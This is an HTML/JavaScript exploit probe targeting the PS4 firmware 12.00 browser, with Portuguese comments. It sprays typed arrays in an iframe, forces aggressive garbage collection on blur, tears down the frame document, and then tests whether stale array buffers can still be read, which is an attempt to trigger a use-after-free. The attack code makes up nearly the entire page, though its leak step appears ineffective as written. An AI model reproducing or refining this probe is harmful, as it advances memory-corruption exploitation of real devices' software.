<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Iframe UAF Probe</title>
</head>
<body>

<h2>PS4 12.00 - Iframe Post-Teardown Test</h2>

<button onclick="startTest()">Start Test</button>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

let leakedControllers = null;
let leakedArray = null;

function startTest() {
    log("[*] Creating iframe...");

    const iframe = document.createElement("iframe");
    iframe.style.width = "400px";
    iframe.style.height = "200px";
    document.body.appendChild(iframe);

    const fWin = iframe.contentWindow;
    const fDoc = fWin.document;

    fDoc.open();
    fDoc.write(`
        <html>
        <body>
        <button onclick="run()">Run Inside Frame</button>
        <script>
            const PATTERN = 2.121995791e-314;
            let controllers = [];

            for (let i = 0; i < 5000; i++) {
                let arr = new Float64Array(8);
                arr[0] = i;
                controllers.push(arr);
            }

            window.run = function() {
                document.documentElement.webkitRequestFullscreen?.();

                window.onblur = function() {

                    // 🔥 GC AGRESSIVO (o que deu mais crash)
                    controllers = null;
                    for (let i = 0; i < 20000; i++) {
                        new ArrayBuffer(0x10000);
                    }

                    // expor tentativa de leak (se ainda existir)
                    try {
                        parent.postMessage({
                            type: "LEAK",
                            controllers: controllers
                        }, "*");
                    } catch(e) {}

                    // teardown crítico
                    setTimeout(() => {
                        document.open();
                        document.write("<h1>Teardown</h1>");
                        document.close();
                    }, 1000);
                };
            };
        <\/script>
        </body>
        </html>
    `);
    fDoc.close();

    // =========================
    // RECEBER REFERÊNCIA (se possível)
    // =========================
    window.addEventListener("message", (e) => {
        if (e.data && e.data.type === "LEAK") {
            leakedControllers = e.data.controllers;

            try {
                leakedArray = leakedControllers ? leakedControllers[0] : null;
                log("[+] Leak recebido");
            } catch (err) {
                log("[!] Erro ao salvar leak: " + err);
            }
        }
    });

    // =========================
    // TESTES PÓS-TEARDOWN
    // =========================
    setTimeout(() => {
        log("[*] Running post-teardown tests...");

        try {
            log("[TEST A] Array access:");
            log(leakedArray ? leakedArray[0] : "null");
        } catch(e) {
            log("[TEST A ERROR] " + e);
        }

        try {
            log("[TEST B] Buffer:");
            log(leakedArray ? leakedArray.buffer.byteLength : "null");
        } catch(e) {
            log("[TEST B ERROR] " + e);
        }

        try {
            log("[TEST C] DataView:");
            let dv = new DataView(leakedArray.buffer);
            log(dv.getUint32(0, true));
        } catch(e) {
            log("[TEST C ERROR] " + e);
        }

    }, 4000);
}
</script>

</body>
</html>
